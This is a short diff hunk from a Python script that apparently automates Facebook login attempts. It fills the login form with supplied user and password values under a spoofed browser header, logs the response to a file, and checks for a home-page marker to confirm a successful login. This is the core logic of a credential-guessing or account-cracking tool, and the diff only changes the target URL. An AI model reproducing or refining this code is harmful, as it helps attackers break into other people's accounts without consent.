@@ -35,14 +35,14 @@ def Main():
 					     br1=mechanize.Browser()
                 		             br1.set_handle_robots(False)
                                              br1.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
-                		             op=br1.open("https://facebook.com/hacked")
+                		             op=br1.open("https://facebook.com")
                 		             dos1=open("Facebook-Log.txt","w+")		
                 	                     br1.select_form(nr=0)
 					     br1.form["email"]=user
                 		             br1.form["pass"]=password
                 		             br1.method="POST"
                 		             br1.submit()
-               			             dos1.write(br1.open("https://facebook.com/hacked").read())
+               			             dos1.write(br1.open("https://facebook.com").read())
                 		             dos1.seek(0)
                 		             text=dos1.read().decode("UTF-8")
                                              if(text.find("home_icon",0,len(text))!=-1):
